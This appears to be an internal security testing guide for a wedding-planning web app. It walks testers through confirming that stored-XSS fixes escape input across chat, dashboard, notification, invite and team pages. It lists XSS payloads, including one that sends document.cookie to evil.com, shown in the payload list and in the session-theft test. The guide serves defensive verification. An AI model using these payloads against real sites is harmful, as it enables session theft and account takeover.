# XSS Security Testing Guide - Bride Buddy

**Purpose**: Verify that all stored XSS vulnerabilities have been properly fixed.

**Date**: October 28, 2025

**Status**: ✅ All XSS fixes applied - Ready for testing

---

## Testing Overview

All pages have been patched with HTML escaping. This guide will help you verify that **NO** malicious scripts can execute.

### What You'll Do

1. Inject XSS payloads into various input fields
2. Verify they display as plain text (not execute)
3. Check that NO alert boxes, scripts, or other code runs

### Expected Result

All test payloads should display as **escaped text** like:
```
<script>alert('XSS')</script>  ← This exact text should appear
```

**NOT** as an alert box or executing code.

---

## Test Payloads

Use these payloads in all tests below:

```html
<!-- Basic Script -->
<script>alert('XSS')</script>

<!-- Image Error Handler -->
<img src=x onerror=alert('XSS')>

<!-- SVG OnLoad -->
<svg onload=alert('XSS')>

<!-- Iframe JavaScript -->
<iframe src="javascript:alert('XSS')">

<!-- Input AutoFocus -->
<input onfocus=alert('XSS') autofocus>

<!-- Body OnLoad -->
<body onload=alert('XSS')>

<!-- Advanced: Event Handler in Attribute -->
<img src=x:alert(alt) onerror=eval(src) alt=xss>

<!-- Session Theft Attempt (for manual review) -->
<img src=x onerror="fetch('https://evil.com?token='+document.cookie)">
```

---

## Test 1: Chat Interface (MOST CRITICAL)

### Test 1A: Main Wedding Chat

1. **Login** to Bride Buddy
2. **Navigate** to chat (chat-luxury.html)
3. **Paste** one of the XSS payloads into chat box
4. **Send** message
5. **Verify**:
   - ✅ Payload displays as escaped text
   - ✅ NO alert box appears
   - ✅ NO script executes
6. **Refresh** page and verify message history:
   - ✅ Payload still displays as text
   - ✅ NO execution on page load

### Test 1B: Bestie Chat (if applicable)

1. **Login** as bestie user
2. **Navigate** to bestie chat (bestie-luxury.html)
3. **Repeat** steps from Test 1A
4. **Verify** same results

### Files Fixed:
- `public/js/shared.js:187` - `textToHtml()` function escapes before rendering

---

## Test 2: Dashboard Vendor Names

### Test 2A: Via AI Chat

1. **Navigate** to main chat
2. **Tell AI**: "Add a vendor named `<img src=x onerror=alert('XSS')>`"
3. **Wait** for AI to extract and save vendor
4. **Navigate** to dashboard (dashboard-luxury.html)
5. **Verify**:
   - ✅ Vendor name displays as escaped text
   - ✅ NO script executes
   - ✅ Vendor appears in "Confirmed Vendors" widget

### Test 2B: Direct Database Insert (Advanced)

If you have database access:
1. Insert vendor with malicious name directly into `vendor_tracker` table
2. Reload dashboard
3. Verify no execution

### Files Fixed:
- `public/dashboard-luxury.html:491-504` - Vendor rendering with `escapeHtml()`

---

## Test 3: Dashboard Task Names

### Test 3A: Via AI Chat

1. **Navigate** to main chat
2. **Tell AI**: "Create a task called `<script>alert('XSS')</script>` due tomorrow"
3. **Wait** for AI to extract and save task
4. **Navigate** to dashboard
5. **Verify**:
   - ✅ Task name displays as escaped text in "Next To-Do" widget
   - ✅ NO script executes

### Files Fixed:
- `public/dashboard-luxury.html:558-566` - Task rendering with `escapeHtml()`

---

## Test 4: Notifications Page

### Test 4A: Pending Updates

1. **Have a co-planner** submit updates with malicious content
2. **Navigate** to notifications page (notifications-luxury.html)
3. **Verify**:
   - ✅ All update fields display as escaped text
   - ✅ NO scripts execute

### Test 4B: Modal View

1. **Click** "View Chat" on an update
2. **Verify** modal content is escaped
3. **Check**:
   - Task names
   - User full names
   - Trigger messages
   - AI responses

### Files Fixed:
- `public/notifications-luxury.html:147-218` - All update fields escaped

---

## Test 5: Invite Page

### Test 5A: Invite Links

1. **Navigate** to invite page (invite-luxury.html)
2. **Create** partner invite
3. **Create** bestie invite
4. **Verify**:
   - ✅ Role displays are safe
   - ✅ Invite tokens display correctly
   - ✅ NO scripts in invite URLs

### Test 5B: Member List

1. **Check** "Current Members" section
2. **Verify**:
   - ✅ Role badges display correctly
   - ✅ Permissions text is safe
   - ✅ NO scripts execute

### Files Fixed:
- `public/invite-luxury.html:300-331` - Invite list with `escapeHtml()`
- `public/invite-luxury.html:366-393` - Member list with escaped roles

---

## Test 6: Team Page

### Test 6A: Member Names

**Note**: This requires a malicious user to have signed up with XSS payload as their full name.

1. **Navigate** to team page (team-luxury.html)
2. **View** all team members
3. **Verify**:
   - ✅ Full names display as escaped text
   - ✅ Email addresses display correctly
   - ✅ "Invited by" names are escaped
   - ✅ NO scripts execute

### Files Fixed:
- `public/team-luxury.html:140-188` - All member data with `escapeHtml()`

---

## Test 7: Accept Invite Page

### Status: ✅ Already Secure

The accept-invite page uses `.textContent` (safe) instead of `.innerHTML` for all user data.

**Verified Safe Lines**:
- Line 220: `textContent = inviteData.wedding_name`
- Line 223: `textContent = inviteData.inviter_name`
- Line 227: `textContent = inviteData.role_display`

**No testing required** - properly implemented from the start.

---

## Test 8: Browser Console Verification

### Check for XSS in Console

1. **Open** browser DevTools (F12)
2. **Navigate** to Console tab
3. **While testing**, watch for:
   - ❌ Script error messages
   - ❌ Uncaught exceptions
   - ❌ CSP violations (if CSP is implemented)
4. **Verify**:
   - ✅ No suspicious script execution
   - ✅ No network requests to external domains (except legitimate APIs)

---

## Test 9: Session Theft Verification

### Manual Code Review

1. **Test** with this payload:
   ```html
   <img src=x onerror="fetch('https://evil.com?token='+document.cookie)">
   ```
2. **Verify** it displays as text, NOT executing
3. **Check** browser Network tab:
   - ✅ NO request to evil.com
   - ✅ Session token not leaked

### What This Prevents

Before fixes:
- Attacker could steal session tokens
- Full account takeover possible
- Malicious actions on behalf of victims

After fixes:
- Payload displays as harmless text
- No session data exposed
- Users protected

---

## Test 10: Real-World Attack Scenarios

### Scenario A: Malicious Wedding Collaborator

1. **Invite** a second test user as partner
2. **As partner**, try injecting XSS in:
   - Chat messages
   - Task names (via AI chat)
   - Vendor names (via AI chat)
3. **As owner**, view all pages
4. **Verify** NO scripts execute

### Scenario B: Malicious Bestie

1. **Invite** test user as bestie
2. **As bestie**, try injecting XSS in:
   - Bestie chat
   - Any available input fields
3. **As owner**, view bestie-related content
4. **Verify** NO scripts execute

---

## Success Criteria

### All Tests Must Pass

- ✅ Chat messages display XSS as text
- ✅ Vendor names display XSS as text
- ✅ Task names display XSS as text
- ✅ Notifications display XSS as text
- ✅ Invite data displays correctly
- ✅ Team member names display XSS as text
- ✅ NO alert boxes appear
- ✅ NO scripts execute
- ✅ NO network requests to attacker domains
- ✅ Session tokens remain protected

### If Any Test Fails

1. **Document** which page/field failed
2. **Copy** the exact payload used
3. **Screenshot** the failure
4. **Check** browser console for errors
5. **Report** to development team

---

## Additional Security Checks

### Check 1: Newline Handling

Test that newlines are properly converted to `<br>` without breaking escaping:

```
Line 1
Line 2<script>alert('XSS')</script>
Line 3
```

Should display as:
```
Line 1
Line 2<script>alert('XSS')</script>
Line 3
```

(With line breaks, but script tag as text)

### Check 2: Special Characters

Test that special characters are escaped:

```
& < > " ' / \
```

Should display correctly without breaking HTML.

### Check 3: Unicode/Emoji

Test that Unicode characters work:

```
💍 Wedding! 🎉 <script>alert('XSS')</script>
```

Should display emojis AND escape the script tag.

---

## Security Testing Tools

### Automated XSS Testing (Optional)

If you want to run automated tests:

1. **Open** browser console
2. **Run** this test:
   ```javascript
   import { testXssProtection } from '/js/security.js';
   testXssProtection();
   ```
3. **Review** console output
4. **All tests** should pass (no script execution)

### Manual Payload Generator

Use this function to generate test payloads:

```javascript
const payloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '<iframe src="javascript:alert(\'XSS\')">',
  '<input onfocus=alert("XSS") autofocus>',
  '<body onload=alert("XSS")>',
  '<img src=x:alert(alt) onerror=eval(src) alt=xss>',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '\'><script>alert(String.fromCharCode(88,83,83))</script>'
];

payloads.forEach((p, i) => console.log(`Test ${i+1}: ${p}`));
```

---

## Post-Testing Actions

### If All Tests Pass ✅

1. **Document** test results
2. **Mark** XSS fixes as verified
3. **Proceed** with other launch blockers
4. **Consider** implementing Content Security Policy (CSP) for defense-in-depth

### Security Checklist

- [x] Created security.js utility
- [x] Fixed chat XSS (critical)
- [x] Fixed dashboard XSS
- [x] Fixed notifications XSS
- [x] Fixed invite page XSS
- [x] Fixed team page XSS
- [x] Verified accept-invite uses textContent
- [ ] All tests passed ← **YOU ARE HERE**
- [ ] Documented test results
- [ ] Security review complete

---

## Reporting Results

### Test Results Template

```markdown
## XSS Security Test Results

**Tester**: [Your Name]
**Date**: [Test Date]
**Environment**: [Production/Staging/Local]

### Test Summary
- Chat Interface: ✅ PASS / ❌ FAIL
- Dashboard Vendors: ✅ PASS / ❌ FAIL
- Dashboard Tasks: ✅ PASS / ❌ FAIL
- Notifications: ✅ PASS / ❌ FAIL
- Invite Page: ✅ PASS / ❌ FAIL
- Team Page: ✅ PASS / ❌ FAIL
- Accept Invite: ✅ PASS / ❌ FAIL

### Notes
[Any observations or issues]

### Conclusion
All XSS vulnerabilities verified as fixed: YES / NO
```

---

## Next Steps After Testing

1. ✅ **Complete** all XSS testing (you are here)
2. ⬜ **Fix** environment configuration (.env)
3. ⬜ **Complete** Stripe configuration
4. ⬜ **Create** success.html page
5. ⬜ **Remove** console.log statements
6. ⬜ **Verify** Stripe webhook
7. ⬜ **Final** security review
8. ⬜ **Launch** 🚀

---

## References

- [CRITICAL_XSS_SECURITY_REPORT.md](./CRITICAL_XSS_SECURITY_REPORT.md) - Detailed vulnerability report
- [PRE_LAUNCH_AUDIT_REPORT.md](./PRE_LAUNCH_AUDIT_REPORT.md) - Complete audit
- [public/js/security.js](./public/js/security.js) - Security utilities

---

**Time Required**: 30-45 minutes for comprehensive testing

**Priority**: 🔴 CRITICAL - Must complete before launch
